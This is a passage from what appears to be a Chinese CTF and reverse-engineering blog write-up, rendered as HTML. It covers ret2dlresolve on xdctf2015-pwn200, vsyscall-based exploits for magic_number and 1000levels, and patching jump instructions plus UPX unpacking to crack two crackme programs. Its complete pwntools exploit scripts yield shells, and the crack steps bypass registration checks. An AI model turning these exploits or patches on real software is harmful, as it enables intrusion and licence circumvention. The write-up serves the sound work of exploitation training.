href="#dl-runtime-resolve-link-map-reloc-arg" class="headerlink" title="_dl_runtime_resolve(link_map,reloc_arg)"></a>_dl_runtime_resolve(link_map,reloc_arg)</h3><ol><li>用<code>link_map</code>访问<code>.dynamic</code>，取出<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>的指针</li><li><code>.rel.plt + 第二个参数</code>求出当前函数的重定位表项<code>Elf32_Rel</code>的指针，记作<code>rel</code></li><li><code>rel-&gt;r_info &gt;&gt; 8</code>作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf32_Sym</code>的指针，记作<code>sym</code></li><li><code>.dynstr + sym-&gt;st_name</code>得出符号名字符串指针</li><li>在动态链接库查找这个函数的地址，并且把地址赋值给<code>*rel-&gt;r_offset</code>，即GOT表</li><li>调用这个函数</li></ol><p>但_dl_runtime_resolve的主体其实是调用_dl_fixup</p><p><strong>_dl_fixup</strong>是在glibc-2.23/elf/dl-runtime.c实现的</p><p>ret2dlresolve的情况更多适用于没有打印函数的程序，毕竟有了打印函数就可以直接用ret2libc了</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="xdctf2015-pwn200-32位栈传参式"><a href="#xdctf2015-pwn200-32位栈传参式" class="headerlink" title="xdctf2015-pwn200(32位栈传参式)"></a>xdctf2015-pwn200(32位栈传参式)</h3><p>也可以用ret2libc做</p><p>用ret2dlresolve做的话就是很常规的套路</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28525)#***</span></span><br><span class="line">p=process(<span class="string">&#x27;./bof&#x27;</span>)<span class="comment">#***</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt0 = e.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">rel_plt = e.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym = e.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = e.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset=<span class="number">112</span><span class="comment">#***</span></span><br><span class="line">read_plt_addr=e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">four_pop_ret=<span class="number">0x08048628</span></span><br><span class="line">leave_ret_addr=<span class="number">0x0804851A</span></span><br><span class="line">base_addr=<span class="number">0x0804a800</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_sym_addr=base_addr+<span class="number">32</span></span><br><span class="line"></span><br><span class="line">align=<span class="number">0x10</span>-((fake_sym_addr-dynsym)&amp;<span class="number">0xf</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_sym_addr+=align</span><br><span class="line"></span><br><span class="line">st_name=fake_sym_addr+<span class="number">0x10</span>-dynstr</span><br><span class="line"></span><br><span class="line">st_info=<span class="number">12</span></span><br><span class="line"></span><br><span class="line">fake_sym=p32(st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(st_info)</span><br><span class="line"></span><br><span class="line">r_offset=e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">r_sym=(fake_sym_addr-dynsym)/<span class="number">0x10</span>   <span class="comment">#偏移是下标偏移</span></span><br><span class="line">r_type=<span class="number">0x7</span></span><br><span class="line">r_info=(<span class="built_in">int</span>(r_sym)&lt;&lt;<span class="number">8</span>)+(r_type)</span><br><span class="line">reloc_index=base_addr-rel_plt+<span class="number">24</span>    <span class="comment">#偏移是地址偏移</span></span><br><span class="line"></span><br><span class="line">fake_rel_plt=p32(r_offset)+p32(r_info)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1=offset*<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">payload1+=p32(read_plt_addr) </span><br><span class="line">payload1+=p32(four_pop_ret)</span><br><span class="line">payload1+=p32(<span class="number">0</span>)</span><br><span class="line">payload1+=p32(base_addr)</span><br><span class="line">payload1+=p32(<span class="number">100</span>)</span><br><span class="line">payload1+=p32(base_addr-<span class="number">4</span>)</span><br><span class="line">payload1+=p32(leave_ret_addr)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">payload2=p32(plt0)</span><br><span class="line">payload2+=p32(reloc_index)</span><br><span class="line"></span><br><span class="line">payload2+=<span class="string">b&#x27;abcd&#x27;</span><span class="comment">#返回地址</span></span><br><span class="line">payload2+=p32(base_addr+<span class="number">80</span>) <span class="comment">#指向binsh</span></span><br><span class="line">payload2+=<span class="string">b&#x27;aaaa&#x27;</span>   <span class="comment">#</span></span><br><span class="line">payload2+=<span class="string">b&#x27;bbbb&#x27;</span>   <span class="comment">#read有三个参数</span></span><br><span class="line">payload2+=fake_rel_plt</span><br><span class="line">payload2+=align*<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">payload2+=fake_sym</span><br><span class="line">payload2+=<span class="string">b&#x27;system\x00&#x27;</span></span><br><span class="line">payload2+=(<span class="number">80</span>-<span class="built_in">len</span>(payload2))*<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">payload2+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="ezzzz-64位"><a href="#ezzzz-64位" class="headerlink" title="ezzzz(64位)"></a>ezzzz(64位)</h3><p>64位full relro有点难搞,网上找到的题解似乎用的方式与linkmap无关</p><h1 id="任务Ⅱ"><a href="#任务Ⅱ" class="headerlink" title="任务Ⅱ"></a>任务Ⅱ</h1><p><strong>vsyscall</strong></p><p>gdb运行程序的时候会发现无论是否开启pie和aslr,内存<code>ffffffffff600000-ffffffffff601000</code>处一定是属于<code>vsyscall</code></p><p>将这块内存<code>dump memory ./dump ffffffffff600000 ffffffffff601000</code>dump下来查看,可以发现</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/13348817-23d78409dea3408f.webp" alt=""></p><p>内部是三个系统调用并跟随着retn</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>vsyscall的利用其实就是在程序地址随机化的情况下,通过在栈上寻找仅有部分比特位与我们需要的返回地址不同的地址信息,通过溢出部分写修改该地址,然后将vsyscall视为一个已知地址的gadget使返回地址一步步移动到所修改处</p><p>其实还是栈溢出的简单利用</p><h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><h3 id="magic-number"><a href="#magic-number" class="headerlink" title="magic_number"></a>magic_number</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_9A0(a1, a2, a3);</span><br><span class="line">  v5 = rand();</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">305419896</span> )</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your Input :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>因为pie的存在,且程序简单没有输出几乎难以利用</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-07-25_172833.png" alt=""></p><p>观察栈上可以发现有与我们所需要的地址只差最后8比特位的地址</p><p>只要修改它并通过vsyscall返回到该处即可getshell</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;magic_number&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;magic_number&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0xFFFFFFFFFF600000</span>)+p64(<span class="number">0xFFFFFFFFFF600000</span>)+p64(<span class="number">0xFFFFFFFFFF600000</span>)+p64(<span class="number">0xFFFFFFFFFF600000</span>)+<span class="string">b&#x27;\xA8&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your Input :\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="1000levels"><a href="#1000levels" class="headerlink" title="1000levels"></a>1000levels</h3><p>非常有意思的一道题</p><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/1000levels&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>存在pie</p><p>程序有一个hint函数很关键,虽然我们无法使得show_int为非0,但是无论条件是否成立system的地址都会被保存到[rbp-0x110]处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hint</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">264</span>]; <span class="comment">// [rsp+8h] [rbp-108h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( show_hint )</span><br><span class="line">    <span class="built_in">sprintf</span>(v1, <span class="string">&quot;Hint: %p\n&quot;</span>, &amp;system);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">strcpy</span>(v1, <span class="string">&quot;NO PWN NO FUN&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000CFB 48 8B 05 CE 12 20 00          mov     rax, cs:system_ptr</span><br><span class="line">.text:0000000000000D02 48 89 85 F0 FE FF FF          mov     [rbp+var_110], rax</span><br></pre></td></tr></table></figure><p>再看另一个关键的函数go</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">go</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 num; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">256</span>]; <span class="comment">// [rsp+20h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many levels?&quot;</span>);</span><br><span class="line">  num = read_num();</span><br><span class="line">  <span class="keyword">if</span> ( num &gt; <span class="number">0</span> )</span><br><span class="line">    v4 = num;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Coward&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Any more?&quot;</span>);</span><br><span class="line">  v5 = v4 + read_num();</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt;= <span class="number">999</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;More levels than before!&quot;</span>);</span><br><span class="line">      v6 = <span class="number">1000LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s go!&#x27;&quot;</span>);</span><br><span class="line">    v2 = time(<span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( level(v6) )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = time(<span class="number">0LL</span>);</span><br><span class="line">      <span class="built_in">sprintf</span>(v7, <span class="string">&quot;Great job! You finished %d levels in %d seconds\n&quot;</span>, v6, (<span class="type">unsigned</span> <span class="type">int</span>)(v3 - v2));</span><br><span class="line">      <span class="built_in">puts</span>(v7);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You failed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Coward&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为hint和go在调用时栈的环境是相同的,因此二者的rbp-0x110也是相同的</p><p>那么也就是说在go函数中若输入v4不大于0,v4便不会被初始化而是上次保存的system地址</p><p>之后的<code>v5 = v4 + read_num();</code>允许我们修改system地址</p><p>不过单独的system并没有什么作用,也无法写入binsh字符串,故而我们可以利用system来找到one_gadget</p><p>最后利用vsyscall使one_gadget成为返回地址</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)  </span><br><span class="line">p = process(<span class="string">&#x27;./1000levels&#x27;</span>)   </span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">vsyscall = <span class="number">0xffffffffff600000</span>  </span><br><span class="line">  </span><br><span class="line">system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line">execv_gadget = <span class="number">0x4527a</span>  </span><br><span class="line">offset_addr = execv_gadget - system_addr  </span><br><span class="line">    </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;How many levels?\n&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">p.sendafter(<span class="string">b&#x27;Any more?\n&#x27;</span>,<span class="built_in">str</span>(offset_addr))  </span><br><span class="line"></span><br><span class="line"><span class="comment">#level内部存在递归调用,当v5&gt;999时取1000次递归</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">999</span>):  </span><br><span class="line">   p.recvuntil(<span class="string">b&#x27;Question: &#x27;</span>)  </span><br><span class="line">   a = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>))  </span><br><span class="line">   p.recvuntil(<span class="string">b&#x27;* &#x27;</span>)  </span><br><span class="line">   b = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>))  </span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;Answer:&#x27;</span>,<span class="built_in">str</span>(a*b))  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(vsyscall)*<span class="number">3</span>  </span><br><span class="line">  </span><br><span class="line">p.sendafter(<span class="string">b&#x27;Answer:&#x27;</span>,payload)  </span><br><span class="line">  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="任务Ⅲ"><a href="#任务Ⅲ" class="headerlink" title="任务Ⅲ"></a>任务Ⅲ</h1><h2 id="crackme4-ajj1"><a href="#crackme4-ajj1" class="headerlink" title="crackme4-ajj1"></a>crackme4-ajj1</h2><p>字符串智能搜索发现</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-07-24_202900.png" alt=""></p><p>双击跟随</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">0045803B  |. /75 76         jnz short CKme.004580B3</span><br><span class="line">0045803D  |. |33DB          xor ebx,ebx</span><br><span class="line">0045803F  |&gt; |8D55 E4       /lea edx,[local.7]</span><br><span class="line">00458042  |. |8B86 D4020000 |mov eax,dword ptr ds:[esi+0x2D4]</span><br><span class="line">00458048  |. |E8 FBB2FCFF   |call CKme.00423348</span><br><span class="line">0045804D  |. |8B45 E4       |mov eax,[local.7]                       ;  CKme.&lt;ModuleEntryPoint&gt;</span><br><span class="line">00458050  |. |E8 27BBFAFF   |call CKme.00403B7C</span><br><span class="line">00458055  |. |83C0 03       |add eax,0x3</span><br><span class="line">00458058  |. |8D55 E8       |lea edx,[local.6]</span><br><span class="line">0045805B  |. |E8 A4FAFAFF   |call CKme.00407B04</span><br><span class="line">00458060  |. |FF75 E8       |push [local.6]                          ;  CKme.&lt;ModuleEntryPoint&gt;</span><br><span class="line">00458063  |. |8D55 E0       |lea edx,[local.8]</span><br><span class="line">00458066  |. |8B86 D4020000 |mov eax,dword ptr ds:[esi+0x2D4]</span><br><span class="line">0045806C  |. |E8 D7B2FCFF   |call CKme.00423348</span><br><span class="line">00458071  |. |FF75 E0       |push [local.8]</span><br><span class="line">00458074  |. |8D55 DC       |lea edx,[local.9]</span><br><span class="line">00458077  |. |8BC3          |mov eax,ebx</span><br><span class="line">00458079  |. |E8 86FAFAFF   |call CKme.00407B04</span><br><span class="line">0045807E  |. |FF75 DC       |push [local.9]                          ;  CKme.004415B7</span><br><span class="line">00458081  |. |8D45 FC       |lea eax,[local.1]</span><br><span class="line">00458084  |. |BA 03000000   |mov edx,0x3</span><br><span class="line">00458089  |. |E8 AEBBFAFF   |call CKme.00403C3C</span><br><span class="line">0045808E  |. |43            |inc ebx</span><br><span class="line">0045808F  |. |83FB 13       |cmp ebx,0x13</span><br><span class="line">00458092  |.^|75 AB         \jnz short CKme.0045803F</span><br><span class="line">00458094  |. |33D2          xor edx,edx</span><br><span class="line">00458096  |. |8B86 F0020000 mov eax,dword ptr ds:[esi+0x2F0]</span><br><span class="line">0045809C  |. |E8 BFB1FCFF   call CKme.00423260</span><br><span class="line">004580A1  |. |A1 20B84500   mov eax,dword ptr ds:[0x45B820]</span><br><span class="line">004580A6  |. |83C0 70       add eax,0x70</span><br><span class="line">004580A9  |. |BA 14814500   mov edx,CKme.00458114                    ;  恭喜恭喜！注册成功</span><br><span class="line">004580AE  |. |E8 9DB8FAFF   call CKme.00403950</span><br><span class="line">004580B3  |&gt; \33C0          xor eax,eax</span><br></pre></td></tr></table></figure><p>存在两个关键跳转指令</p><p>断点跟随发现确实关键点在这</p><p>jnz都修改为jz</p><p>即成功crackme</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-07-24_203704.png" alt=""></p><h2 id="crackme4-ajj2"><a href="#crackme4-ajj2" class="headerlink" title="crackme4-ajj2"></a>crackme4-ajj2</h2><p>ollydbg打开提示说存在加壳</p><p>die一查是upx壳</p><p><code>upx.exe -d ckme002</code>脱壳</p><p>之后还是常规的查找字符串跟随</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-07-24_204459.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">004473F1   . /0F84 88000000 je CKme002.0044747F</span><br><span class="line">004473F7   . |81BB 08030000&gt;cmp dword ptr ds:[ebx+0x308],0x230D</span><br><span class="line">00447401   . |74 7C         je short CKme002.0044747F</span><br><span class="line">00447403   . |81BB 10030000&gt;cmp dword ptr ds:[ebx+0x310],0xF94</span><br><span class="line">0044740D   . |75 70         jnz short CKme002.0044747F</span><br><span class="line">0044740F   . |8B83 18030000 mov eax,dword ptr ds:[ebx+0x318]</span><br><span class="line">00447415   . |3B83 14030000 cmp eax,dword ptr ds:[ebx+0x314]</span><br><span class="line">0044741B   . |75 62         jnz short CKme002.0044747F</span><br><span class="line">0044741D   . |81BB 1C030000&gt;cmp dword ptr ds:[ebx+0x31C],0x3E7</span><br><span class="line">00447427   . |74 56         je short CKme002.0044747F</span><br><span class="line">00447429   . |33D2          xor edx,edx                              ;  CKme002.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0044742B   . |8B83 D8020000 mov eax,dword ptr ds:[ebx+0x2D8]</span><br><span class="line">00447431   . |8B08          mov ecx,dword ptr ds:[eax]</span><br><span class="line">00447433   . |FF51 5C       call dword ptr ds:[ecx+0x5C]</span><br><span class="line">00447436   . |33D2          xor edx,edx                              ;  CKme002.&lt;ModuleEntryPoint&gt;</span><br><span class="line">00447438   . |8B83 DC020000 mov eax,dword ptr ds:[ebx+0x2DC]</span><br><span class="line">0044743E   . |8B08          mov ecx,dword ptr ds:[eax]</span><br><span class="line">00447440   . |FF51 5C       call dword ptr ds:[ecx+0x5C]</span><br><span class="line">00447443   . |33D2          xor edx,edx                              ;  CKme002.&lt;ModuleEntryPoint&gt;</span><br><span class="line">00447445   . |8B83 E0020000 mov eax,dword ptr ds:[ebx+0x2E0]</span><br><span class="line">0044744B   . |8B08          mov ecx,dword ptr ds:[eax]</span><br><span class="line">0044744D   . |FF51 5C       call dword ptr ds:[ecx+0x5C]</span><br><span class="line">00447450   . |33D2          xor edx,edx                              ;  CKme002.&lt;ModuleEntryPoint&gt;</span><br><span class="line">00447452   . |8B83 E4020000 mov eax,dword ptr ds:[ebx+0x2E4]</span><br><span class="line">00447458   . |8B08          mov ecx,dword ptr ds:[eax]</span><br><span class="line">0044745A   . |FF51 5C       call dword ptr ds:[ecx+0x5C]</span><br><span class="line">0044745D   . |A1 A8984400   mov eax,dword ptr ds:[0x4498A8]</span><br><span 